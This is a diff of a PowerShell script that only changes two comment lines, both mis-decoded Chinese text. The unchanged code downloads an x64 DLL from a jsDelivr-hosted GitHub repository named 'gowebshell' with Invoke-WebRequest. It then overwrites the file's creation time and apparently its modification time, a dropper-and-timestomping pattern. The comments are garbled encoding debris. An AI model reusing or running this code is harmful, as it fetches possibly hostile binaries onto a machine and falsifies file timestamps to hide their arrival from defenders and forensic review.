@@ -1,4 +1,4 @@
-# ¶¨ÒåÒªÏÂÔØµÄÎÄ¼şÁĞ±í
+# å®šä¹‰è¦ä¸‹è½½çš„æ–‡ä»¶åˆ—è¡¨
 $fileList = @(
     @{
         Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8081/x64.dll"
@@ -20,7 +20,7 @@ $fileList = @(
     }
 )
 
-# ÏÂÔØ²¢ÉèÖÃÎÄ¼şµÄ´´½¨Ê±¼äºÍĞŞ¸ÄÊ±¼ä
+# ä¸‹è½½å¹¶è®¾ç½®æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´å’Œä¿®æ”¹æ—¶é—´
 foreach ($fileInfo in $fileList) {
     Invoke-WebRequest -Uri $fileInfo.Url -OutFile $fileInfo.OutputPath
     Set-ItemProperty -Path $fileInfo.OutputPath -Name CreationTime -Value $fileInfo.CreationTime
